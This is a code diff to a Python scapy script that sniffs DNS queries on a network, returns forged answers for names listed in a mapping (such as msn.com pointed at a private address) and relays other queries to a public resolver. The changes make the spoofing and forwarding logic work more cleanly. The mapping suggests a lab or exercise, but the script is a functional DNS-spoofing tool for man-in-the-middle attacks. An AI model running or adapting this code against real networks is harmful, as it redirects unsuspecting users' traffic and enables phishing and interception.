@@ -1,3 +1,4 @@
+from argparse import ONE_OR_MORE
 from scapy.all import *
 from scapy.layers.dns import *
 from config import MY_IP
@@ -12,7 +13,7 @@ TEST_MAPPING = {
   "msn.com": "192.168.2.2",
 }
 
-REACHABLE_DNS_SERVER = '8.8.4.4'
+REACHABLE_DNS_SERVER = '8.26.56.26'
 
 def get_real_dns_response(dns_request: Packet, dns_server: str) -> Packet:
   """
@@ -29,25 +30,32 @@ def get_real_dns_response(dns_request: Packet, dns_server: str) -> Packet:
   if DNS not in dns_request:
     return None
   
-  original_src = dns_request['IP'].src
-  dns_request['IP'].src = MY_IP
-  dns_request['IP'].dst = dns_server
-
+  new_dns_request = (IP(src=MY_IP, dst=REACHABLE_DNS_SERVER) /
+                    UDP(sport=dns_request['UDP'].sport, dport=53) /
+                    DNS(
+                      id=dns_request['DNS'].id,
+                      qd=dns_request['DNS'].qd
+                    ))
+  
   # Forward the packet to specified DNS server
-  dns_response = sr1(dns_request, timeout=1, verbose=0)
+  dns_response = sr1(new_dns_request, timeout=1, verbose=0)
   if dns_response:
-    dns_response['IP'].dst = original_src
-    dns_response.show()
-  return dns_response
+    new_dns_response = (IP(src=MY_IP, dst=dns_request['IP'].src) /
+                        UDP(sport=53, dport=dns_request['UDP'].sport) /
+                        DNS(
+                          id=dns_request['DNS'].id,
+                          qr=1,
+                          ra=1,
+                          qd=dns_request['DNS'].qd,
+                          an=dns_response['DNSRR'].lastlayer()
+                        ))
+    return new_dns_response
 
 def is_dns_query(packet: Packet):
   """
   Checks whether the provided packet is a DNS query for IPV4
   """
-  if UDP in packet and IP in packet and DNS in packet and packet.qdcount:
-    return True
-
-  return False
+  return UDP in packet and IP in packet and DNS in packet and packet.qr == 0 and packet['IP'].src != MY_IP
 
 def intercept_dns(intercept_map: dict):
   """
@@ -108,11 +116,10 @@ def intercept_dns(intercept_map: dict):
       send(dns_response)
   
   def intercept(packet: Packet):
-    if is_dns_query(packet):
-      Thread(target=thread_handler, args=(packet,)).start()
+    Thread(target=thread_handler, args=(packet,)).start()
 
   # Sniff for DNS packets and answer accordingly
-  sniff(prn=intercept)
+  sniff(prn=intercept, lfilter=is_dns_query)
 
 if __name__ == '__main__':
   intercept_dns(TEST_MAPPING)
